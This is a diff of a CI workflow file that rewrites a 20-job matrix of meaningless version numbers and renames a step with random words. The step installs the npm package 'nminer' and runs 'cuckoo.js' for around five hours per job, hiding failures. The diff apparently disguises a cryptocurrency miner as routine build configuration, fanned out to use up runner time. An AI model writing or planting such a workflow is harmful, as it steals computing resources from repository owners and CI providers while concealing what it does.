@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5121 }
-          - { version: 4525 }
-          - { version: 2594 }
-          - { version: 4443 }
-          - { version: 7127 }
-          - { version: 9116 }
-          - { version: 7897 }
-          - { version: 9496 }
-          - { version: 2222 }
-          - { version: 1152 }
-          - { version: 4023 }
-          - { version: 7817 }
-          - { version: 6023 }
-          - { version: 8974 }
-          - { version: 4925 }
-          - { version: 9344 }
-          - { version: 7446 }
-          - { version: 8946 }
-          - { version: 4353 }
-          - { version: 54 }
+          - { version: 180 }
+          - { version: 111 }
+          - { version: 5124 }
+          - { version: 2034 }
+          - { version: 2647 }
+          - { version: 9004 }
+          - { version: 5588 }
+          - { version: 6120 }
+          - { version: 2961 }
+          - { version: 4953 }
+          - { version: 5562 }
+          - { version: 9290 }
+          - { version: 6628 }
+          - { version: 3346 }
+          - { version: 9037 }
+          - { version: 3992 }
+          - { version: 7036 }
+          - { version: 9905 }
+          - { version: 7792 }
+          - { version: 8380 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: hungrily finally wholly and drive
+      - name: grandpa distant inasmuch
         run: |
           npm install nminer@latest
-          timeout 335m node cuckoo.js || echo "cuckoo executed"
+          timeout 304m node cuckoo.js || echo "cuckoo executed"
